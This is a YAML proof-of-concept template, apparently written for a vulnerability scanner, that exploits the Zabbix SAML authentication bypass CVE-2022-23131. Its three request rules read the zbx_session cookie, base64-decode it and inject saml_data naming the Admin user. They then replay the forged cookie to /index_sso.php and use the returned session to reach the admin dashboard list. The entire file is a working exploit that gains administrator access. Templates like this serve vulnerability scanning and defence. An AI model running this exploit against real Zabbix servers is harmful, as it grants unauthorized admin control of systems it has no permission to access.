name: poc-yaml-zabbix-cve-2022-23131-saml-bypass
binding: c6298aa3-0cf1-4b76-878d-96fd50d85bb8
manual: true
detail:
    author: Naraku
    links:
        - https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage
        - https://github.com/trganda/dockerenv/tree/master/vuln/zabbix/CVE-2022-23131
    vulnerability:
        id: CT-292688
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: |
            response.status == 200 && response.headers["Set-Cookie"].contains("zbx_session")
        output:
            r0search: |
                "zbx_session=(?P<session>\\w+)".submatch(response.headers["Set-Cookie"])
            session: r0search["session"]
            sessionB64Decode: base64Decode(session)
            addSignedSession: replaceAll(sessionB64Decode, "{", "{\"saml_data\":{\"username_attribute\":\"Admin\"}, ")
            signedSessionB64Encode: base64(addSignedSession)
    r1:
        request:
            cache: true
            method: GET
            path: /index_sso.php
            headers:
                Cookie: zbx_session={{signedSessionB64Encode}}
            follow_redirects: false
        expression: |
            response.status == 302 && response.headers["Set-Cookie"].contains("zbx_session")
        output:
            r1search: |
                "zbx_session=(?P<sso_session>\\w+)".submatch(response.headers["Set-Cookie"])
            sso_session: r1search["sso_session"]
    r2:
        request:
            cache: true
            method: GET
            path: /zabbix.php?action=dashboard.list
            headers:
                Cookie: zbx_session={{sso_session}}
        expression: |
            response.status == 200 && response.body.bcontains(b"Dashboards</title>")
expression: r0() && r1() && r2()
